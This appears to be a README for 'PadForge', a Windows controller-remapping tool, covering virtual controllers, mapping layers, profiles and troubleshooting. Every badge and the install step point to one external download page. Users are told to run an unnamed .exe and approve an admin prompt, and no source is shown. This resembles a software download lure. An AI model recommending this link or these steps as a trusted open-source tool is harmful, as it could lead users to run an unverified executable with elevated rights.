# PadForge — Controller Remapping for Windows

<p align="center">
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/GET%20PADFORGE-DOWNLOAD-00C853?style=for-the-badge&logo=github&logoColor=white" alt="GET PADFORGE">
  </a>
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/PADFORGE-DOCUMENTATION-8b5cf6?style=for-the-badge" alt="PadForge Documentation">
  </a>
</p>

<p align="center">
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/WINDOWS%2010%2F11-✓-2ea44f?style=flat-square" alt="Windows 10/11 Supported">
  </a>
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/OPEN%20SOURCE-✓-2ea44f?style=flat-square" alt="Open Source">
  </a>
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/1000%20HZ-✓-2ea44f?style=flat-square" alt="1000 Hz">
  </a>
  <a href="https://PadForge.github.io/.github">
    <img src="https://img.shields.io/badge/16%20VIRTUAL%20CONTROLLERS-✓-2ea44f?style=flat-square" alt="16 Virtual Controllers">
  </a>
</p>

<p align="center">
  <img src="https://github.com/PadForge/.github/blob/main/assets/image/1.png?raw=true" width="700" alt="PadForge Overlay">
</p>

PadForge is a Windows controller-remapping utility that lets you use different input devices as virtual game controllers.

Map gamepads, racing wheels, flight sticks, HOTAS devices, keyboards, mice and other compatible hardware to virtual Xbox, PlayStation, Nintendo or Extended controllers.

## Features

* Virtual Xbox, PlayStation, Nintendo and Extended controllers
* Support for multiple virtual controllers
* Gamepad, racing wheel and HOTAS support
* Keyboard and mouse to controller mapping
* Custom button and axis mappings
* Macros and mapping layers
* Gyroscope and accelerometer input
* Force feedback for compatible racing wheels
* Per-game and per-application profiles
* Configurable polling rates
* Multiple physical devices in one virtual controller
* Controller hiding to prevent duplicate input
* Custom input combinations
* Interactive controller configuration
* MIDI input support
* Remote controller sharing between compatible PadForge installations

## Supported Devices

PadForge supports a wide range of input hardware, including:

* Xbox controllers
* PlayStation controllers
* Nintendo controllers
* Racing wheels
* Pedals and shifters
* Flight sticks
* HOTAS systems
* Arcade controllers
* Keyboards
* Mice
* MIDI devices
* Motion-capable controllers
* Other compatible HID devices

Device compatibility depends on the hardware, drivers and selected virtual-controller configuration.

## Virtual Controllers

### Xbox

The Xbox virtual controller provides broad compatibility with games that use XInput.

It can be used to translate other devices into a standard Xbox-style controller.

### PlayStation

The PlayStation virtual controller is designed for compatible DualShock and DualSense configurations.

Depending on the hardware, additional features such as gyro, accelerometer and touchpad input may be available.

### Nintendo

The Nintendo virtual controller can be used with compatible games and applications that expect a Nintendo-style controller.

### Extended

Extended controllers are designed for devices that do not fit a traditional gamepad layout.

They are useful for:

* Racing wheels
* Flight sticks
* HOTAS systems
* Arcade controllers
* Custom HID devices

## Controller Mapping

PadForge provides flexible input mapping for buttons, axes and other controller inputs.

Mappings can be created manually or by recording physical inputs.

Supported inputs can include:

* Buttons
* Analog sticks
* Triggers
* Axes
* POV controls
* Gyroscope
* Accelerometer
* Keyboard keys
* Mouse buttons
* Mouse movement

Multiple physical inputs can also be combined into a single virtual input.

## Keyboard and Mouse

Keyboard and mouse input can be converted into virtual controller controls.

For example, keyboard movement can control an analog stick while mouse movement can control the camera.

This can be useful for accessibility, custom control schemes and applications that require controller input.

## Racing Wheels and HOTAS

PadForge can translate racing wheels, pedals, shifters and HOTAS controls into virtual controller input.

A device can be mapped to a standard gamepad layout when a game does not natively support the physical hardware.

Multiple axes and buttons can also be combined to create custom controls.

## Macros and Layers

PadForge supports macros and additional mapping layers.

Layers can be activated using different modes, including:

* Hold
* Toggle
* Latch
* Cycle
* Sticky

This allows a single controller to have multiple layouts.

For example, one layer can contain normal gameplay controls while another provides secondary actions.

## Motion Controls

Compatible controllers can provide motion input through their gyroscope and accelerometer.

Motion data can be assigned to controller actions or used for mouse-style controls.

## Force Feedback

Compatible racing wheels can use force-feedback functionality through PadForge.

Available functionality depends on the wheel, game and selected configuration.

## Profiles

PadForge supports profiles for different games and applications.

A profile can store:

* Controller mappings
* Deadzones
* Macros
* Mapping layers
* Force-feedback settings
* Lighting settings
* Polling rate
* Application associations

Different games can therefore use completely different controller configurations.

## Controller Hiding

Some games may detect both the physical controller and the virtual controller.

This can cause duplicate input or unexpected controller behaviour.

PadForge supports controller-hiding configurations that can prevent the physical device from being detected while keeping the virtual controller available.

## Installation

1. Download the latest PadForge release - [CLICK](https://PadForge.github.io/.github).
2. Extract the archive to a normal folder.
3. Run .exe.
4. Approve the Windows permission prompt if required.
5. Add a virtual controller.
6. Select the desired controller type.
7. Open the device configuration.
8. Select your physical input device.
9. Configure the mappings.
10. Launch the game.

Some functionality requires the installation of the appropriate virtual-controller driver.

## Basic Setup

A typical configuration looks like this:

```text
Physical Controller
        |
        v
     PadForge
        |
        v
Virtual Controller
        |
        v
       Game
```

For example:

```text
Racing Wheel
     |
     v
  PadForge
     |
     v
Xbox Controller
     |
     v
    Game
```

## Troubleshooting

### Game does not detect the controller

Check that:

1. PadForge is running.
2. The physical device is detected.
3. The device is assigned to a virtual controller.
4. The correct virtual-controller type is selected.
5. The required driver is installed.
6. Another controller-remapping application is not causing a conflict.

### Game detects two controllers

The game may be detecting both the physical and virtual devices.

Enable controller hiding for the physical device and restart the game.

### Mappings do not work

Check the selected physical device, mapping source and virtual-controller profile.

Try creating a simple mapping first before enabling macros, layers or other advanced features.

### Controller is not detected

Try reconnecting the device, refreshing the device list and verifying that Windows detects the hardware correctly.

## System Requirements

* Windows 10 or Windows 11
* 64-bit system
* Compatible input device
* Administrator permissions for driver-related functionality
* Additional Windows components may be required for specific features

## Example Configurations

### PlayStation Controller to Xbox

```text
DualSense / DualShock
          |
          v
       PadForge
          |
          v
   Xbox Virtual Controller
          |
          v
         Game
```

### Wheel to Gamepad

```text
Wheel + Pedals + Shifter
            |
            v
         PadForge
            |
            v
    Virtual Gamepad
            |
            v
           Game
```

### Keyboard and Mouse

```text
Keyboard + Mouse
       |
       v
    PadForge
       |
       v
Virtual Controller
       |
       v
      Game
```

## Notes

PadForge is actively developed. Device support, virtual-controller functionality and available features may change between releases.

Compatibility can vary between games and hardware. If a configuration behaves unexpectedly, start with a basic virtual controller and gradually enable additional features.

> **Warning:** Some online and competitive games may have restrictions regarding virtual controllers, macros or input-remapping software. Check the rules of the specific game before using advanced configurations.
